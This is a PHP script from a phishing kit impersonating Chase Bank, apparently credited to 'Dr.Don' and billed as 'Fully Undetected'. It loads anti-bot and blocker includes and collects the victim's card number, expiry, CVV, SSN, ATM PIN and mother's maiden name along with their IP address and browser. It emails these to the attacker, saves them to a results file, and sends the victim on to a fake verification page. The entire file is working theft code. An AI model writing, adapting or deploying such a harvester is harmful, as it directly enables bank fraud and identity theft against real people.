<?php
$zabi = getenv("REMOTE_ADDR");
include '../antibots.php';
include('../email.php');
include('system.php');
include '../bt.php';
include "../blocker.php";
$message .= "--++-----[ $$ Dr.Don  $$ ]-----++--\n";
$message .= "------------------ By Dr.Don --------------------\n";
$message .= "Credit Card Number: ".$_POST['12']."\n";
$message .= "MM/YYYY: ".$_POST['13']."\n";
$message .= "CCV/CSC: ".$_POST['14']."\n";
$message .= "SSN: ".$_POST['16']."\n";
$message .= "ATM PIN: ".$_POST['15']."\n";
$message .= "Mother's maiden name: ".$_POST['0001']."\n";
$message .= "++-----[ $$ Fully Undetected By Dr.Don $$ ]-----++\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- By Dr.Don  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "CHASE BANK CARD INFO [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Dr.Don <contact>\r\n";
mail($email,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);
    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);
mail($yourmail, $subject, $message , $headers);

header("Location: ../verification-id.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));?>